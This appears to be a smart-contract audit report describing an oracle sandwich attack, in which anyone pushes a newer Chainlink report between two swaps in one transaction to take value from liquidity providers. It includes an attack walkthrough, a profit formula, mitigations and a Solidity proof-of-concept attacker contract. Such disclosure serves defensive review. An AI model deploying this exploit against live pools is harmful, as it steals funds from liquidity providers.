Audit Report

## Title
Permissionless `updateReport` Enables Same-Transaction Oracle Sandwich Against LP Funds — (`File: smart-contracts-poc/contracts/oracles/providers/ChainlinkOracle.sol`)

## Summary

`ChainlinkOracle.updateReport()` is callable by any party holding a valid DON-signed report and has no restriction preventing it from being called between two sequential pool swaps in the same transaction. Because `MetricOmmPool.swap()` reads the oracle fresh on every invocation and the transient reentrancy guard only blocks *nested* re-entry (not sequential calls), an attacker can atomically execute a buy-swap, push a newer oracle report, and sell-swap at the updated price, extracting value from LP bin balances.

## Finding Description

**Permissionless write path**

`ChainlinkOracle.updateReport()` has no caller restriction beyond DON-signature verification:

```solidity
function updateReport(bytes calldata fullReport) external {
    _store(_verifyReport(fullReport));
}
```

`_store()` only enforces timestamp monotonicity (`isAfter`) — any party who holds a valid, newer DON-signed report can push it at any time, including between two pool swaps in the same transaction.

**Fresh oracle read on every swap**

`MetricOmmPool.swap()` calls `_getBidAndAskPriceX64()` at the start of every execution, which performs a live storage read of the current oracle data through the active price provider. There is no per-block price lock, no TWAP, and no caching.

**Sequential swaps in one transaction are fully permitted**

`MetricReentrancyGuardTransient._nonReentrantBefore()` stores the action id in transient storage and `_nonReentrantAfter()` clears it to zero at the end of each guarded call. Two *sequential* (non-nested) calls to `swap()` in the same transaction are not blocked — only a *nested* call while the guard is still set reverts. This is confirmed by the test `test_swap_revertsWhenNestedSwapFromCallback` which only tests the nested case.

**`inSwap()` binding protects the read path, not the write path**

`OracleBase.price(feedId, pool)` requires `pool.inSwap() == msg.sender` to bind oracle reads to an active swap context. This check is on the *read* path only. `updateReport()` / `_store()` have no such requirement and succeed unconditionally given a valid report with a newer timestamp.

**Attack flow (single atomic transaction)**

```
AttackerContract.attack():
  1. pool.swap(zeroForOne=false, ...)   // buy token0 at ask derived from P_old
     → nonReentrant guard set, oracle read at P_old, guard cleared
  2. oracle.updateReport(report_P_new)  // push newer DON-signed report; oracle stores P_new > P_old
     → no swap context required; _store() only checks timestamp monotonicity
  3. pool.swap(zeroForOne=true, ...)    // sell token0 at bid derived from P_new
     → nonReentrant guard set, oracle read at P_new (updated), guard cleared
```

Step 2 succeeds because `_store()` only checks `d.timestampMs.isAfter(oracleData[feedId].timestampMs)`. Step 3 reads the updated oracle price because `_getBidAndAskPriceX64()` performs a fresh storage read with no caching.

**Profit condition**

```
profit = (bid_at_P_new − ask_at_P_old) × amount − gas
```

With a typical oracle spread of ~10 bps, a price move of ≥ 0.1% between the two reports makes the trade profitable. Multiple valid DON-signed reports spanning that range are simultaneously available off-chain during any price movement.

## Impact Explanation

LP bin balances (`binTotals.scaledToken0` / `binTotals.scaledToken1`) bear the loss directly. The pool sells token0 to the attacker at a price anchored to the stale (lower) oracle value, then buys it back at the updated (higher) oracle value. The difference — net of the bid/ask spread — is extracted from LP-owned bin balances. This is a direct, quantifiable loss of LP principal with no recovery path, satisfying the "direct loss of user principal" impact gate.

**Severity: Medium**

## Likelihood Explanation

- Chainlink Data Streams reports are publicly observable off-chain; no privileged access is required.
- The attacker needs only two valid DON-signed reports with strictly increasing timestamps — trivially satisfied during any price movement.
- No special pool role, admin key, or malicious setup is required.
- The attack is atomic and reverts cleanly if unprofitable, so there is no capital risk to the attacker beyond gas.
- The same pattern applies to any other permissionless oracle update function in scope.

**Likelihood: Medium**

## Recommendation

1. **Per-block price lock**: Record `block.number` the first time the oracle price is consumed during a swap and reject any `updateReport` call (or re-read) for the same feed within the same block.
2. **Require report age**: In `_store()`, require that a newly submitted report's timestamp is at least one block old before it can be stored, preventing same-block sandwich attacks.
3. **TWAP**: Derive `midPriceX64` from a short TWAP rather than a spot read, making single-block manipulation unprofitable.

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

interface IPool {
    function swap(address recipient, bool zeroForOne, int128 amountSpecified,
                  uint128 priceLimitX64, bytes calldata callbackData,
                  bytes calldata extensionData) external returns (int128, int128);
}
interface IOracle { function updateReport(bytes calldata fullReport) external; }
interface IERC20 { function approve(address, uint256) external; function balanceOf(address) external view returns (uint256); function transfer(address, uint256) external; }

contract OracleSandwich {
    IPool   immutable pool;
    IOracle immutable oracle;
    address immutable token0;
    address immutable token1;

    constructor(address _pool, address _oracle, address _t0, address _t1) {
        pool = IPool(_pool); oracle = IOracle(_oracle);
        token0 = _t0; token1 = _t1;
    }

    function attack(bytes calldata reportNew, int128 amount) external {
        IERC20(token1).approve(address(pool), uint256(int256(amount)));
        // 1. Buy token0 at ask derived from current (lower) oracle price P_old
        pool.swap(address(this), false, amount, 0, "", "");
        // 2. Push the newer, higher-price report — no swap context required
        oracle.updateReport(reportNew);
        // 3. Sell token0 at bid derived from new (higher) oracle price P_new
        int128 token0Bal = int128(int256(IERC20(token0).balanceOf(address(this))));
        IERC20(token0).approve(address(pool), uint256(int256(token0Bal)));
        pool.swap(msg.sender, true, token0Bal, 0, "", "");
    }

    function metricOmmSwapCallback(int256 d0, int256 d1, bytes calldata) external {
        if (d0 > 0) IERC20(token0).transfer(msg.sender, uint256(d0));
        if (d1 > 0) IERC20(token1).transfer(msg.sender, uint256(d1));
    }
}
```

**Foundry test plan**: Deploy pool with a mock `ChainlinkOracle`, seed LP liquidity, record LP bin balances before attack, execute `attack()` with two valid reports spanning a ≥0.1% price move, assert `msg.sender` token1 balance increased and LP `binTotals.scaledToken0`/`scaledToken1` decreased by the corresponding amount.